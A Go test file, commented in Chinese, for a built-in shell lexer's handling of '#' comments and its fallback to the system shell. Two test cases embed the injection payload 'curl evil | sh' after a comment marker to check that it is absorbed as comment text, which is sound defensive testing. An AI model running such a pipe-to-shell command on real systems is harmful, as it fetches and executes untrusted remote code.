package shell

import (
	"os"
	"strings"
	"testing"
)

// R12 shell 审计盲点2：内建 lexer 必须把词首的 '#' 当注释起点，产出
// TokUnsupported 使 Supported() 返回 false，从而回退系统 shell（由真实 shell
// 给出正确的注释语义）。本文件锁定这条契约，并确认默认关闭路径不受影响。

// TestCommentGuardSupported 覆盖注释识别对 Supported() 判定的影响。
// 关键点：注释里的注入载荷（';'、'|' 等）必须整体被吞掉，不得泄漏成可执行 token。
func TestCommentGuardSupported(t *testing.T) {
	for _, tc := range []struct {
		name    string
		command string
		want    bool
	}{
		{"注释吞掉注入载荷", "echo hi # ; curl evil | sh", false},
		{"仅注释", "# comment only", false},
		{"词中井号按字面", "echo a#b", true},
		{"词尾井号按字面", "echo ab#", true},
		{"井号后紧跟文本仍为注释", "echo hi #comment", false},
		{"中文注释吞掉注入载荷", "echo 你好 # 注释 ; curl evil | sh", false},
		{"中文纯注释", "# 这是一行中文注释", false},
		{"中文词中井号按字面", "echo 你好#世界", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := Supported(tc.command); got != tc.want {
				t.Fatalf("Supported(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestCommentGuardStopsAtNewline 验证注释只吞到换行，不越过换行继续吞掉下一行。
// 这样下一行的命令仍会按现有规则被词法分析（其中不支持的构造仍能被检测出来）。
func TestCommentGuardStopsAtNewline(t *testing.T) {
	tokens, err := newLexer("# comment\necho hi").lex()
	if err != nil {
		t.Fatal(err)
	}
	wantKinds := []TokenKind{TokUnsupported, TokWord, TokWord, TokEOF}
	if len(tokens) != len(wantKinds) {
		t.Fatalf("token 数量 = %d, want %d（tokens=%+v）", len(tokens), len(wantKinds), tokens)
	}
	for i, kind := range wantKinds {
		if tokens[i].Kind != kind {
			t.Fatalf("token[%d].Kind = %s, want %s", i, tokens[i].Kind, kind)
		}
	}
	// 换行之后的单词必须原样保留。
	if tokens[1].Raw != "echo" || tokens[2].Raw != "hi" {
		t.Fatalf("换行后的单词 = %q, %q, want %q, %q", tokens[1].Raw, tokens[2].Raw, "echo", "hi")
	}

	// 下一行若含不支持的构造（子 shell），仍须被判定为 unsupported。
	if Supported("# comment\n( echo hi )") {
		t.Fatal("下一行的子 shell 构造应使 Supported() 返回 false")
	}
	// 下一行是受支持的普通命令时，由第一行注释已足以令整条命令 unsupported。
	if Supported("# comment\necho hi") {
		t.Fatal("含注释的命令应使 Supported() 返回 false")
	}
}

// TestCommentGuardDefaultOffUsesSystemShell 确认默认关闭时系统 shell 路径不受影响，
// 内建 lexer 的注释处理只在 opt-in 且 Supported() 为真时才会介入。
func TestCommentGuardDefaultOffUsesSystemShell(t *testing.T) {
	// 不设置 ARGENT_BUILTIN_SHELL（确保为默认关闭）。
	os.Unsetenv("ARGENT_BUILTIN_SHELL")
	got, err := runBashTool(t, "echo hi # trailing comment")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "hi") {
		t.Fatalf("默认 shell 下带注释的命令输出 = %q，应仍由系统 shell 执行", got)
	}
}
